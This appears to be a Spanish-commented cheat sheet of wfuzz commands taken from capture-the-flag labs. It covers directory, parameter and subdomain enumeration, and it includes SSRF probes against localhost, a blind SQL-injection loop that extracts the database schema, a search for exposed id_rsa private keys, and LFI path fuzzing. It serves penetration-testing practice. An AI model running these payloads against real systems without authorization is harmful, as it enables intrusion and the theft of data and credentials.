```bash
# Enumeración de directorios en la raíz del sitio
wfuzz -c -t 20 --hc 404 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-directories.txt "http://10.10.110.17:8080/FUZZ"

# Enumeración de parámetros en una petición POST para descubrir variables ocultas
wfuzz -c -t 20 --hw 67 -X POST --hc 404 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt -d "FUZZ=http://127.0.0.1" "http://10.10.110.17:8080/view_image"

# Enumeración de ficheros en un endpoint que toma URLs como parámetro, buscando rutas interesantes
wfuzz -c -t 20 --hw 37 -X POST --hc 404 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-files.txt -d "www=http://2130706433/FUZZ" "http://10.10.110.17:8080/view_image"

# Fuzzing de subdominios vía cabecera Host (vhost enumeration)
wfuzz -c --hc 404 --hw 982 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.monitorsthree.htb" http://monitorsthree.htb

# Fuzzing de parámetros en GET, buscando variables válidas (ejemplo: img)
wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/common.txt --hh 0 "http://target.com/page.php?FUZZ=value"

# Extracción de caracteres uno a uno usando SQLi con wfuzz en bucle
for i in {1..40}; do \
    wfuzz -c --hc 404,500 -w alphanums.txt \
    "http://prioritise.thm/?order=(CASE+WHEN+(SELECT+hex(substr(sql,$i,1))+FROM+sqlite_master+WHERE+type%3d'table'+and+tbl_name+NOT+like+'sqlite_%25'+limit+1+offset+0)+%3d+hex('FUZZ')+THEN+id+ELSE+load_extension(0)+END)" \
    2>/dev/null | grep -i 200 && echo ""; \
done

# Enumeración de subdominios en "cyprusbank.thm"
wfuzz -c --hw 3 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.cyprusbank.thm" cyprusbank.thm

# Enumeración de rutas internas con posibles claves privadas (id_rsa con distintas extensiones)
wfuzz -c -z list,pem-ppk-key-p12-pfx-cer http://127.0.0.1:9999/id_rsa.FUZZ

# Enumeración de subdominios múltiples en distintos escenarios (vhost, DNS, etc.)
wfuzz -c --hc 404 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.site.htb" http://site.htb

# Enumeración de endpoints dentro de un directorio público
wfuzz -c --hc 404 -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 40 http://10.10.140.77/static/FUZZ

# Fuzzing de rutas para LFI/RFI con diccionario de ficheros sensibles
wfuzz -c --hl 7 --hc 404 -w files/file_inclusion_linux.txt http://mountaineer.thm/wordpress/images..FUZZ
```